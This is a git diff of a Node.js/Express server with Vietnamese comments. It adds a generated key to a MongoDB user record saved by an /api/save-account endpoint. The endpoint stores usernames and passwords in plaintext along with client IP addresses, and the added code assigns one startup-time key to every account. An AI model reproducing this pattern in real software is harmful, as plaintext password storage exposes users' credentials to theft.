@@ -9,7 +9,7 @@
 //thì làm ơn tăng cái biến đếm này Lên
 //để người xui xẻo tiếp theo còn biết đường chạy:
 //
-//total_hours_wasted_here = 0 
+//total_hours_wasted_here = 1 
 
 const express = require('express');
 const mongoose = require('mongoose');
@@ -17,7 +17,7 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000; // Để chạy được trên Render
 require('dotenv').config();
-
+const { generateKey } = require('../script/phu_tro/tao_key/make_key');
 // 1. Cấu hình Middleware
 app.use(express.json());
 app.use(cors());
@@ -25,16 +25,18 @@ app.use(cors());
 // 2. Kết nối MongoDB
 const mongoURI = process.env.MONGO_URI;
 
+
 mongoose.connect(mongoURI)
     .then(() => console.log("✅ Đã kết nối MongoDB thành công!"))
     .catch(err => console.error("❌ Lỗi kết nối MongoDB:", err));
-
+const makenewKey = generateKey();
 // 3. Tạo khuôn mẫu dữ liệu (Schema)
 const UserSchema = new mongoose.Schema({
     username: { type: String, required: true },
     password: { type: String, required: true },
     timestamp: { type: Date, default: Date.now },
-    ipuser: { type: String }
+    ipuser: { type: String },
+    key: { type: String, default: () => generateKey() }
 });
 const User = mongoose.model('User', UserSchema);
 
@@ -56,7 +58,7 @@ app.post('/api/save-account', async (req, res) => {
     }
 
     try {
-        const newUser = new User({ username, password, ipuser: userIP });
+        const newUser = new User({ username, password, ipuser: userIP, key: makenewKey });
         await newUser.save(); // Lưu trực tiếp lên đám mây
         console.log("💾 Đã lưu vào MongoDB:", username);
         res.status(200).send("userok");
